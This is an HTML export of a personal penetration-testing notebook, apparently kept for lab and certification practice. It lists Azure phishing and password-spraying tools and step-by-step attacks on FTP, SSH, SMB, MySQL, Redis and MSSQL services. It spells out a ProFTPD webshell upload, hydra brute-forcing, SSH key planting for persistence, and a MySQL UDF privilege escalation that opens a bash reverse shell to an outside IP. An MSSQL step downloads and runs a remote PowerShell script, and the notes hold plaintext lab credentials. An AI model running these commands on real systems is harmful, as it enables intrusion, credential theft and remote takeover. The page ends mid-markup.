Virtual Network (VNet) - VNet allows you to create a virtual network in the cloud, where you can launch resources in a logically isolated area. It&#39;s important to secure access to your VNet and ensure that it is properly configured to prevent unauthorized access to your resources.</li></ol></p><p></p><p></p><p>Cheat sheets:</p><p></p><p><a href="https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md">https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure--Enumeration_563.html"></a><h1 class='title level-5'>Enumeration</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure--Tools_564.html"></a><h1 class='title level-5'>Tools</h1><br/><p><img src="images/564-1.png" alt="images/564-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure--Tools--evilginx2_565.html"></a><h1 class='title level-6'>evilginx2</h1><br/><p>evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.</p><p><a href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure--Tools--MSOLSpray_566.html"></a><h1 class='title level-6'>MSOLSpray</h1><br/><p>A password spraying tool for Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn&#39;t exist, if a user doesn&#39;t exist, if the account is locked, or if the account is disabled.</p><p></p><p>BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!</p><p></p><p><a href="https://github.com/dafthack/MSOLSpray">https://github.com/dafthack/MSOLSpray</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure--Tools--MSOLSpray--fireprox_567.html"></a><h1 class='title level-7'>fireprox</h1><br/><p>Can be well used together with MSOLSpray for bypassing rate limiting or IP bans.</p><p><a href="https://github.com/ustayready/fireprox">https://github.com/ustayready/fireprox</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure--Tools--ScoutSuite_568.html"></a><h1 class='title level-6'>ScoutSuite</h1><br/><p>Multicloud, great start to an assessment</p><p></p><p><a href="https://github.com/nccgroup/ScoutSuite">https://github.com/nccgroup/ScoutSuite</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure--Tools--AzureHound_569.html"></a><h1 class='title level-6'>AzureHound</h1><br/><p>The bloodhound of Azure</p><p></p><p><a href="https://github.com/BloodHoundAD/AzureHound">https://github.com/BloodHoundAD/AzureHound</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Metadata_582.html"></a><h1 class='title level-4'>Metadata</h1><br/><p><a href="https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b">https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b</a></p><p></p><p>This technique is beautiful if you find ssrf on webapp or get shell</p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Webapp_-_cloud_584.html"></a><h1 class='title level-4'>Webapp -> cloud</h1><br/><p><img src="images/584-1.png" alt="images/584-1.png" /></p><p></p><p></p><p><img src="images/584-2.png" alt="images/584-2.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services_11.html"></a><h1 class='title level-3'>Other Services</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Database_20.html"></a><h1 class='title level-4'>Database</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Other_Services--21__FTP_18.html"></a><h1 class='title level-4'>21 | FTP</h1><br/><p></p><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-ftp">https://book.hacktricks.xyz/pentesting/pentesting-ftp</a></p><p></p><p><span style="color:#234141;">Try anonymous login like this:</span></p><p>ftp 10.10.77.213</p><p><em>anonymous</em></p><p></p><p><span style="color:#234141;">Check for guest account access</span></p><p></p><p>get file.txt</p><p>put malicousfile.aspx</p><p></p><p><span style="color:#234141;">Trick: (This basically downloads everything at once, much faster than get)</span></p><p>prompt off</p><p>recurse on</p><p>mget *</p><p></p><p><span style="color:#3f4043;">You can also do it like this: (Sometimes this is quicker and more stable)</span></p><p>wget -r <a href="ftp://steph:billabong@10.1.1.68">ftp://steph:billabong@10.1.1.68</a></p><p><img src="images/18-1.png" alt="images/18-1.png" /></p><p></p><p><span style="color:#003f34;">test more with this, mby the browser u use impacts it too</span></p><p><a href="ftp://anonymous:null@disco.os:21/shelluw.asp">ftp://anonymous:null@disco.os:21/shelluw.asp</a></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--21__FTP--Bruteforce_160.html"></a><h1 class='title level-5'>Bruteforce</h1><br/><p><span style="color:#234141;">FTP:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt -V 10.10.204.203 ftp -V -e nsr -f -t 50 -K</p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--21__FTP--Exploits_327.html"></a><h1 class='title level-5'>Exploits</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Other_Services--21__FTP--Exploits--Directory_traverse_vuln_311.html"></a><h1 class='title level-6'>Directory traverse vuln</h1><br/><p><a href="https://superuser.com/questions/1044667/ftp-directory-traversal-attack-on-directories-containing-white-spaces">https://superuser.com/questions/1044667/ftp-directory-traversal-attack-on-directories-containing-white-spaces</a></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--21__FTP--Exploits--ProFTPD_1.3.5_328.html"></a><h1 class='title level-6'>ProFTPD 1.3.5</h1><br/><p><a href="https://github.com/joshua17sc/proftpd-1.3.5-reverse-shell-exploit/blob/main/exploit.py">https://github.com/joshua17sc/proftpd-1.3.5-reverse-shell-exploit/blob/main/exploit.py</a></p><p></p><p><a href="https://packetstormsecurity.com/files/162777/ProFTPd-1.3.5-Remote-Command-Execution.html">https://packetstormsecurity.com/files/162777/ProFTPd-1.3.5-Remote-Command-Execution.html</a> <span style="color:#3f4043;">test this</span></p><p></p><p>nc 192.168.121.140 21</p><p></p><p>SITE CPFR /proc/self/cmdline</p><p></p><p>SITE CPTO /tmp/&lt;?php echo exec($_GET[&quot;cmd&quot;]); ?&gt; </p><p></p><p>SITE CPFR /tmp/&lt;?php echo exec($_GET[&quot;cmd&quot;]); ?&gt;</p><p></p><p>SITE CPTO /var/www/html/webshell.php </p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--21__FTP--Exploits--ProFTPD_1.3.3.c_329.html"></a><h1 class='title level-6'>ProFTPD 1.3.3.c</h1><br/><p><a href="https://github.com/shafdo/ProFTPD-1.3.3c-Backdoor_Command_Execution_Automated_Script/blob/main/proFTPD_1.3.3c_exploit.py">https://github.com/shafdo/ProFTPD-1.3.3c-Backdoor_Command_Execution_Automated_Script/blob/main/proFTPD_1.3.3c_exploit.py</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--21__FTP--Exploits--VSFTPD_2.3.4_330.html"></a><h1 class='title level-6'>VSFTPD 2.3.4</h1><br/><p><a href="https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html#:~:text=Victim%3A%20Windows%2010-,VSFTPD%20v2.,a%20shell%20on%20port%206200.">https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html#:~:text=Victim%3A%20Windows%2010-,VSFTPD%20v2.,a%20shell%20on%20port%206200.</a></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--22__SSH_19.html"></a><h1 class='title level-4'>22 | SSH</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Other_Services--22__SSH--Bruteforce_150.html"></a><h1 class='title level-5'>Bruteforce</h1><br/><p><a href="https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux">https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux</a></p><p></p><p><span style="color:#234141;">Bruteforce ssh with hydra using userlist, passwordlist, verbose, 20 threads, testing users without password, testing users who reused their old password, and finally making sure hydra doesn&#39;t retry failed entries:</span></p><p>hydra -L ../users.txt -P passwordfile.txt 10.10.77.213 ssh -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">Cracking ssh private keys:</span></p><p><a href="file:///usr/share/john/ssh2john.py">/usr/share/john/ssh2john.py</a> id_rsa &gt; id_rsa.john</p><p></p><p>john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--22__SSH--id_rsa_logon_persistance_166.html"></a><h1 class='title level-5'>id_rsa logon persistance</h1><br/><p><a href="https://github.com/PinkDraconian/CTF-bash-tools/blob/master/scripts/ctf-ssh.sh">https://github.com/PinkDraconian/CTF-bash-tools/blob/master/scripts/ctf-ssh.sh</a></p><p></p><p><span style="color:#234141;">In this instance we used this ^ script to generate a keypair with no password, give it chmod 600, we then echo our id_rsa to the victim ~/.ssh/authorized_keys folder so we can connect with the keys we just created and make them accept.</span></p><p></p><p>ssh -i id_rsa dwight@172.31.3.1</p><p></p><p>Copy the id_rsa private key from target to your host. Do chmod 600 id_rsa on it. Then ssh -i id_rsa username@target to get shell. If the private key is password-protected, you can try cracking it with John the Ripper using ssh2john to convert it and then running john on the output.</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--22__SSH--common_keys_323.html"></a><h1 class='title level-5'>common keys</h1><br/><p><a href="https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys">https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys</a></p><p></p><p><span style="color:#3f4043;">If you find some authorized keys from target host through linking their hostsystem through smb vulnerability or something, you can do this trick. In this case some id_rsa keys. Let&#39;s say we see this:</span> </p><p><span style="color:#3f4043;">(output from target machine after we did samba_symlink exploit on our targets SMB. For reference, see this: </span><a href="#Methdology--Enumeration--Other_Services--22__SSH--common_keys--Attack_scenario_366.html">Attack scenario</a><span style="color:#3f4043;">)</span></p><p></p><p><img src="images/323-1.png" alt="images/323-1.png" /></p><p></p><p><span style="color:#3f4043;">We can then grep for this particular string from all the files in this folder we download from github with various common ssh keys:</span></p><p><img src="images/323-2.png" alt="images/323-2.png" /></p><p></p><p>Once we found a matching one, simply remove the “.pub” to find the private key that correlates with that one, and give it chmod 600 persmissions, and simple ssh in using -i!</p><p></p><p><img src="images/323-3.png" alt="images/323-3.png" /></p><p></p><p><span style="color:#3f4043;">It&#39;s a cool little trick. </span></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--22__SSH--common_keys--Attack_scenario_366.html"></a><h1 class='title level-6'>Attack scenario</h1><br/><p>Found shares on bob user through RPC using enum4linuxng.</p><p></p><p>Did more enumeration and found Bob&#39;s shares through the guest user using smbmap:</p><p><img src="images/366-1.png" alt="images/366-1.png" /></p><p></p><p></p><p><img src="images/366-2.png" alt="images/366-2.png" /></p><p></p><p>I could now login normally!</p><p></p><p></p><p>Entered the share using smbclient:</p><p>smbclient -U &quot;&quot; &#39;//10.11.1.136/Bob Share/&#39;</p><p></p><p><img src="images/366-3.png" alt="images/366-3.png" /></p><p></p><p></p><p>I find this vulnerability on this samba version that allows us to link the underlying system to a share. And this metasploit module helps us do just that.</p><p><img src="images/366-4.png" alt="images/366-4.png" /></p><p></p><p></p><p>We can now see that rootfs has been succesfully added.</p><p></p><p><img src="images/366-5.png" alt="images/366-5.png" /></p><p></p><p>Indeed, it seems to be working. Let&#39;s see what we can find and try to find a gameplan that can allow us get further access on the system. </p><p></p><p><img src="images/366-6.png" alt="images/366-6.png" /></p><p></p><p>A backups folder, very interesting. Let&#39;s take a look. </p><p></p><p><img src="images/366-7.png" alt="images/366-7.png" /></p><p></p><p>This might be valuable. Let&#39;s download them to our host and inspect further. </p><p></p><p><img src="images/366-8.png" alt="images/366-8.png" /></p><p></p><p>So I saw they are ssh-dss keys, meaning they are DSA keys. I was looking for their private keys through the ftp, but I couldn&#39;t find anything. My next thought were if I could bruteforce this in some way, and then I had an idea. I found this github repo of common dsa files, so I wanted to attempt comparing them to the authorized key file I found and see if I could find a match. <a href="https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys">https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys</a></p><p></p><p></p><p>So I took this <strong>AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuIW+2qnDF7vybPiMNI9/dQ7ck2gLUqPu2F4gfXml8W9RKcqTOVksRmQ5s0O4c88mCqV3F1nzKKMSZbK9yYWbafabX91f2SinBQZbfMGv8+R2TyE78LjAAAAFQDXtJ7Pca0RkEBFcBLfPzmCUBpSeQAAAIEAlK4NYlfGt3uInBaKG0kK/N0nZwX7ji++5xSiLLjI/0M9xacdWaZcPBZ4GretGGIhnYEPlBote8GlG1Ap7li39ATazIXJQguG+Mgun3de73RugX/oGsUt5oatCS2Lo9mfRBijlVYChLyQbgkZMwKziwR1BHUWE/jkCKT7bPEJvw8AAACBAJZHIWHJybvrIcs9oB5hTL/8r+C9gDx+R3vcEFQq58D/UDi5FWzA71IZfcOt2+EPabP77gB6Ad/nNy3BrqmkocwLX+Of1uwMhgD63UeE5fUOuIbW+z4OF1M9tuzFAGALDMHJSx8U8Z11lsiuO4Owx11pAo8Ebq0sKNDd0GzvVQxE</strong> and compared it against all I could find in that common dsa keys file I found.</p><p></p><p>And sure enough we did!</p><p><img src="images/366-9.png" alt="images/366-9.png" /></p><p></p><p>So I found the corresponding public key, and the corresponding private key is in the list too, so we might get ssh access through key authentification!</p><p><img src="images/366-10.png" alt="images/366-10.png" /></p><p></p><p>chmod 600 f1fb2162a02f0f7c40c210e6167f05ca-16858</p><p></p><p>I got some errors at first, but after using ssh with -vv flag, and doing some research.. I found the issue.</p><p></p><p>I needed to add <strong>PubkeyAcceptedKeyTypes +ssh-rsa</strong> to my <a href="file:///etc/ssh/ssh_config">/etc/ssh/ssh_config</a> file. And after doing so, we get in as bob!</p><p><img src="images/366-11.png" alt="images/366-11.png" /></p><p></p><p>ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--22__SSH--SSH_Port_Forwarding_162.html"></a><h1 class='title level-5'>SSH Port Forwarding</h1><br/><p></p><p><a href="https://github.com/PinkDraconian/CTF-bash-tools/blob/master/scripts/ctf-ssh.sh">https://github.com/PinkDraconian/CTF-bash-tools/blob/master/scripts/ctf-ssh.sh</a></p><p></p><p><span style="color:#234141;">In this instance we used this ^ script to generate a keypair with no password, give it chmod 600, we then echo our id_rsa to the victim ~/.ssh/authorized_keys folder so we can connect with the keys we just created and make them accept.</span></p><p></p><p>ssh -i id_rsa -L 2121:localhost:10000 dwight@172.31.3.1</p><p></p><p><span style="color:#234141;">^ Here we found an internal port on victim machine on port 10000 (webmin server), so we use ssh port forwarding to get access to it via localhost. Basically just using their access to port forward it to our localhost on port 2121 in this instance. </span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">From here we can access the webmin service from our machine. (ex http://localhost:2121) </span> </p><p></p><p>==</p><p></p><p><span style="color:#3f4043;">To start ssh on kali, just run</span></p><p>sudo systemctl start ssh</p><p></p><p>gedit /etc/ssh/sshd_config&amp;</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--139-445__SMB_17.html"></a><h1 class='title level-4'>139/445 | SMB</h1><br/><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">https://book.hacktricks.xyz/pentesting/pentesting-smb</a></p><p></p><p></p><p><span style="color:#3f4043;">Nmap Username scan:</span></p><p>nmap -sV 10.1.1.68 --script smb-enum-users.nse -oN nmap_smb_username_script</p><p></p><p><span style="color:#3f4043;">Nmap NSE scans:</span></p><p>nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip</p><p>nmap --script=vuln* --script-args=unsafe=1 -T5 $ip</p><p></p><p></p><p><span style="color:#3f4043;">Scans rpc, smb OS info and some more. Very useful tool </span><span style="text-decoration:underline;">(RUN BOTH)</span></p><p>enum4linux-ng 10.10.253.194 | tee enum4linuxng.log</p><p>enum4linux 10.10.253.194 | tee enum4linux.log</p><p></p><p></p><p><span style="color:#3f4043;">Listing shares as null user if allowed:</span></p><p>smbclient -L \\\\10.10.219.38\</p><p>netexec smb $target -u &#39;guest&#39; -p &#39;&#39; --shares</p><p>netexec smb $target -u svc-admin -p &#39;management2005&#39; -M spider_plus -o DOWNLOAD_FLAG=True</p><p></p><p>rid brute:</p><p>netexec smb $target -u &#39;guest&#39; -p &#39;&#39; --rid-brute</p><p>netexec smb $target -u &#39;guest&#39; -p &#39;&#39; --rid-brute | grep -i &#39;sidtypeuser&#39; | awk &#39;{print$6}&#39; | cut -d &#39;\&#39; -f2 | tee userlist2.txt</p><p></p><p>password policy:</p><p>netexec smb $target --pass-pol</p><p></p><p>smbclient \\\\$target\\NETLOGON -U t-skid</p><p></p><p>netexec smb $target -u &#39;a-whitehat&#39; -p &#39;bNdKVkjv3RR9ht&#39; --spider NETLOGON --regex .</p><p></p><p><span style="color:#3f4043;">Listing with smbmap:</span></p><p>smbmap -u &#39;anonymous&#39; -H 10.11.1.231 -p &quot;&quot;</p><p></p><p><span style="color:#3f4043;">List as authenticated user:</span></p><p>smbclient -L \\\\vulnnet.local\\ -U enterprise-security </p><p></p><p><span style="color:#3f4043;">Mount:</span></p><p>mount -t cifs \\\\192.168.1.41\\helios ./share</p><p><span style="color:#3f4043;">Authenticated mount:</span></p><p>mount -t cifs -o username=helios \\\\192.168.1.41\\helios ./share</p><p></p><p></p><p><span style="color:#3f4043;">Login syntax:</span></p><p>smbclient -U enterprise-core-vn //10.10.219.38/NETLOGON</p><p>smbclient -U enterprise-security \\\\vulnnet.local\\Enterprise-Share</p><p></p><p></p><p><span style="color:#3f4043;">Logging in:</span></p><p>smbclient //10.11.1.31/wwwroot</p><p>smbclient -U &quot;&quot; &#39;//10.11.1.136/Bob Share/&#39; </p><p></p><p><span style="color:#3f4043;">Trick: (This basically downloads everything at once, much faster than get. Dont trust it yet tho:)))</span></p><p>prompt off</p><p>recurse on</p><p>mget *</p><p></p><p><span style="color:#3f4043;">or</span></p><p></p><p>mask</p><p>recurse</p><p>prompt</p><p>mget *</p><p></p><p></p><p><span style="color:#3f4043;">Apparently you can get a reverse shell on windows through uploading (put &lt;filename&gt;) this script in a smb share (Remember the one liner at the end, adding your ip, port etc)</span></p><p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--139-445__SMB--Public_Exploits_316.html"></a><h1 class='title level-5'>Public Exploits</h1><br/><p><span style="color:#3f4043;">Enumerate version number with enum4linux etc </span></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--139-445__SMB--Public_Exploits--Samba__2.2.8_RCE_317.html"></a><h1 class='title level-6'>Samba > 2.2.8 RCE</h1><br/><p>multiple/remote/10.c</p><p></p><p><img src="images/317-1.png" alt="images/317-1.png" /></p><p>Samba 2.2.7a</p><p></p><p></p><p></p><p>searchsploit -m multiple/remote/10.c</p><p></p><p>gcc 10.c -o 10  </p><p></p><p>./10 -b 0 -c 192.168.119.199 -v 10.11.1.115</p><p></p><p>root :)</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--139-445__SMB--Scripts_and_username_enum_324.html"></a><h1 class='title level-5'>Scripts and username enum</h1><br/><p><span style="color:#3f4043;">Very useful. Can find OS info, shares, rpc info etc</span></p><p></p><p>/opt/enum4linux-ng/enum4linux-ng.py -A 10.11.1.8 &gt; enum4linux.txt</p><p></p><p><span style="color:#3f4043;">(Run this, can find more users to than the other usually, but takes long)</span></p><p>enum4linux -a 10.11.1.8</p><p></p><p><span style="color:#3f4043;">Nmap Username scan:</span></p><p>nmap -sV 10.1.1.68 --script smb-enum-users.nse -oN nmap_smb_username_script</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--139-445__SMB--smbmap_242.html"></a><h1 class='title level-5'>smbmap</h1><br/><p><span style="color:#3f4043;">Basic authentification syntax:</span></p><p>smbmap -H 10.11.1.136 <span style="color:#3f4043;">(This tests for anonymous and guest access by default here I believe)</span></p><p>smbmap -H 10.11.1.136 -u &#39;anonymous&#39; -p ‘’</p><p>smbmap -H 10.11.1.136 -u &#39;guest&#39; -p ‘’</p><p>smbmap -H 10.11.1.136 -u &#39;bob&#39; -p ‘Whitebirds231@!’</p><p></p><p></p><p><span style="color:#3f4043;">Recursive output of the directory structure of those shares:</span></p><p>smbmap -H 10.11.1.136 -R </p><p></p><p><span style="color:#3f4043;">Upload files to share:</span></p><p>smbmap -H 10.11.1.136 --upload rev.sh &#39;Bob Share\rev.sh&#39;</p><p></p><p><span style="color:#3f4043;">Downloads files it can access:</span></p><p>smbmap -H 10.11.1.136 --download &quot;Bob Share\Contract Mr. Suzuki.txt&quot;</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--139-445__SMB--smb_nt_status_access_denied_243.html"></a><h1 class='title level-5'>smb nt_status_access_denied</h1><br/><p></p><p></p><p><span style="color:#3f4043;">This fixed it for me:</span></p><p>gedit /etc/samba/smb.conf</p><p></p><p><span style="color:#3f4043;">Put this in:</span></p><p>[global]</p><p>   client min protocol = CORE</p><p>   client max protocol = SMB3</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306_181.html"></a><h1 class='title level-4'>3306</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--MySQL_182.html"></a><h1 class='title level-5'>MySQL</h1><br/><p>sudo apt install default-mysql-client</p><p></p><p>mysql -h 10.10.36.102 -u root -p</p><p></p><p>show databases;</p><p>use mysql;</p><p>show tables;</p><p>show variables;</p><p>SELECT * from users;</p><p></p><p><span style="color:#404040;">using metasploit:</span></p><p></p><p><img src="images/182-1.png" alt="images/182-1.png" /></p><p></p><p><span style="color:#404040;">Dumping</span> <span style="color:#404040;">tables</span>:</p><p></p><p><img src="images/182-2.png" alt="images/182-2.png" /></p><p></p><p><span style="color:#404040;">Dumping Hases:</span></p><p></p><p><img src="images/182-3.png" alt="images/182-3.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--MySQL--MariaDB_228.html"></a><h1 class='title level-6'>MariaDB</h1><br/><p><a href="https://www.thehackingcoach.com/mariadb-tutorial/">https://www.thehackingcoach.com/mariadb-tutorial/</a></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--MySQL--MySQL_4.x-5.0_local_privesc_260.html"></a><h1 class='title level-6'>MySQL 4.x/5.0 local privesc</h1><br/><p><span style="color:#3f4043;">TLDR: This local exploit seems to work on mysql 4.x/5.0. So check version and attempt if the stars align:)</span></p><p></p><p><span style="color:#3f4043;">I used this exploit: </span><a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p><p></p><p>nano raptor_udf2.c</p><p></p><p><span style="color:#3f4043;">copy paste the exploit in here.</span></p><p></p><p><span style="color:#3f4043;">Then we compile the exploit:</span></p><p></p><p>gcc -g -c raptor_udf2.c</p><p></p><p>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</p><p></p><p><span style="color:#3f4043;">Then we log into mysql:</span></p><p></p><p>mysql -u root</p><p></p><p>use mysql;</p><p></p><p>create table foo(line blob);</p><p></p><p>insert into foo values(load_file(&#39;/home/j0hn/sss/raptor_udf2.so&#39;));</p><p></p><p>select * from foo into dumpfile &#39;/usr/lib/raptor_udf2.so&#39;;</p><p> </p><p>create function do_system returns integer soname &#39;raptor_udf2.so&#39;;</p><p> </p><p>select * from mysql.func;</p><p> </p><p>select do_system(&#39;bash -i &gt;&amp; /dev/tcp/192.168.119.198/443 0&gt;&amp;1&#39;);</p><p></p><p><span style="color:#3f4043;">/////</span></p><p></p><p><span style="color:#3f4043;">instead of the reverse shell, you can also do:</span></p><p></p><p>select do_system(&#39;cp /bin/sh /tmp/bashroot; chmod +s /tmp/bashroot&#39;);</p><p></p><p>exit</p><p></p><p>/tmp/bashroot -p</p><p></p><p>id</p><p></p><p> </p><p> </p><p></p><p><img src="images/260-1.png" alt="images/260-1.png" /></p><p></p><p><span style="color:#3f4043;">And we get a shell as root! Awesome!</span></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--MySQL--MariaDB_10.2_341.html"></a><h1 class='title level-6'>MariaDB 10.2</h1><br/><p><a href="https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html">https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html</a></p><p>need root sql creds</p><p></p><p><img src="images/341-1.png" alt="images/341-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--Redis_183.html"></a><h1 class='title level-5'>Redis</h1><br/><p><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></p><p><a href="https://youtu.be/VgMoQWN5UfM?t=262">https://youtu.be/VgMoQWN5UfM?t=262</a></p><p></p><p><span style="color:#234141;">Access</span>:</p><p>redis-cli -h vulnnet.local</p><p></p><p><span style="color:#234141;">Get user.txt:</span></p><p>EVAL “dofile(&#39;C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt&#39;)” 0</p><p></p><p><span style="color:#234141;">Get config info: (could reveal some useful info)</span></p><p>config get *</p><p></p><p>EVAL “dofile(&#39;//10.13.31.108/share&#39;)” 0</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--Mssql_205.html"></a><h1 class='title level-5'>Mssql</h1><br/><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md</a></p><p></p><p>impacket-mssqlclient -db volume -windows-auth disco/&quot;&quot;:&quot;&quot;@10.11.1.13</p><p></p><p>mssqlclient.py RALPH/sa:poiuytrewq@10.11.1.43</p><p><img src="images/205-1.png" alt="images/205-1.png" /></p><p></p><p></p><p><span style="color:#3f4043;">You can get a shell like this:</span></p><p></p><p>enable_xp_cmdshell</p><p>xp_cmdshell powershell iex (iwr -usebasicparsing <a href="http://192.168.119.156/rev2.ps1">http://192.168.119.156/rev2.ps1</a><a href="http://192.168.119.156/rev2.ps1)">)</a></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--Mssql--Extracting_mdf_hashes_244.html"></a><h1 class='title level-6'>Extracting mdf hashes</h1><br/><p><a href="https://pentestsector.com/docs/1.0/services/1443-mssql">https://pentestsector.com/docs/1.0/services/1443-mssql</a></p><p></p><p><span style="color:#3f4043;">The master.mdf hashes could be placed a few different places based on version and placement.</span></p><p></p><p></p><p><span style="color:#3f4043;">Example locations: (Check version first and then try the most common places)</span></p><p>C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\DATA\master.mdf</p><p>C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\backup\master.mdf</p><p>C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf</p><p><a href="https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/">https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/</a></p><p></p><p><span style="color:#3f4043;">Tool:</span></p><p><a href="https://github.com/xpn/Powershell-PostExploitation">https://github.com/xpn/Powershell-PostExploitation</a></p><p></p><p>pwsh</p><p></p><p>Add-Type -Path &#39;OrcaMDF.RawCore.dll&#39;</p><p>Add-Type -Path &#39;OrcaMDF.Framework.dll&#39;</p><p>import-module .\Get-MDFHashes.ps1</p><p>Get-MDFHashes -mdf &quot;C:\Users\admin\Desktop\master.mdf&quot;    <span style="color:#3f4043;">(You can tee the output too.)</span></p><p></p><p><span style="color:#3f4043;">Save hashes and throw them at john. </span></p><p></p><p>john sa.hash --wordlist=/usr/share/wordlists/rockyou.txt</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--Oracle_DB_214.html"></a><h1 class='title level-5'>Oracle DB</h1><br/><p><h2>Attacking mongo:</h2></p><p><a href="https://infinitelogins.com/2020/12/03/pentesting-oracle-databases-with-odat/">https://infinitelogins.com/2020/12/03/pentesting-oracle-databases-with-odat/</a></p><p><a href="https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573">https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573</a></p><p></p><p><span style="color:#3f4043;">Login syntax:</span></p><p>sqlplus &#39;web_app&#39;/&#39;dsfdfoj435GEre4&#39;@10.11.1.222:1521/xe; </p><p></p><p>sqlplus &#39;web_app&#39;/test123@10.11.1.222:1521/xe;as sysdba</p><p></p><p>select * from session_privs;</p><p>==</p><p></p><p></p><p></p><p><span style="color:#212225;">SQLPLUS:</span></p><p><span style="color:#212225;">sqlplus download outside of the apt install one (if the apt install doesn&#39;t work):</span></p><p></p><p><a href="https://zwbetz.com/install-sqlplus-on-linux/#sqlplus-version-193000">https://zwbetz.com/install-sqlplus-on-linux/#sqlplus-version-193000</a></p><p><span style="color:#212225;">follow this one, but use the newest versions</span></p><p>Go to the directory <a href="file:///opt/oracle/instantclient_21_5">/opt/oracle/instantclient_21_5</a></p><p></p><p><span style="color:#212225;">also, after the </span>source ~/.bashrc <span style="color:#212225;">, the </span><span style="color:#3f4043;">bash</span><span style="color:#212225;"> might likely do some crazy things, and just do</span> /bin/bash<span style="color:#212225;"> and then use the program.</span></p><p>sqlplus -h </p><p><span style="color:#212225;">etc..</span></p><p></p><p></p><p></p><p></p><p><h2>Navigation:</h2></p><p><a 